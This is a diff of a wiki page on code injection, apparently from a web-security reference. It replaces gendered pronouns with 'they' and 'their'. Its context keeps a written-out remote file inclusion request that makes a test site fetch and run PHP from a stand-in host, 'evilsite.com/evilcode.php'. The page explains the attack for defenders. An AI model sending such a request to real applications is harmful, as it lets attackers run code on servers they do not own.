@@ -28,7 +28,7 @@ Code Injection differs from [Command
 Injection](Command_Injection "wikilink") in that an attacker is only
 limited by the functionality of the injected language itself. If an
 attacker is able to inject PHP code into an application and have it
-executed, he is only limited by what PHP is capable of. Command
+executed, they are only limited by what PHP is capable of. Command
 injection consists of leveraging existing code to execute commands,
 usually within the context of a shell.
 
@@ -57,7 +57,7 @@ The URL below passes a page name to the include() function.
 The file "evilcode.php" may contain, for example, the phpinfo() function
 which is useful for gaining information about the configuration of the
 environment in which the web service runs. An attacker can ask the
-application to execute his PHP code using the following request:
+application to execute their PHP code using the following request:
 
 <http://testsite.com/?page=http://evilsite.com/evilcode.php>
 
